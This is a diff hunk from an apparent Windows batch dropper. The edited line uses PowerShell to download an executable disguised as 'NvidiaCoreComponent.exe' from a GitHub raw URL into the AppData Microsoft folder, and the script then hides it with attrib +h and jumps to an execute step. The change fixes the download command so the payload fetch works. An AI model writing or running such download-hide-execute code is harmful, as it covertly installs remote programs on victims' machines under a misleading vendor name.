@@ -12,7 +12,7 @@ if exist %appdata%\Microsoft\NvidiaCoreComponent.exe (
 	) else (goto download && goto execute)
 
 :download
-powershell -command "Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/NvidiaCoreComponent.exe?raw=true' -OutFile '$env:appdata\Microsoft\NvidiaCoreComponent.exe'"
+powershell -command "Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/NvidiaCoreComponent.exe?raw=true' -OutFile $env:appdata\Microsoft\NvidiaCoreComponent.exe"
 attrib +h %appdata%\Microsoft\NvidiaCoreComponent.exe
 
 :execute
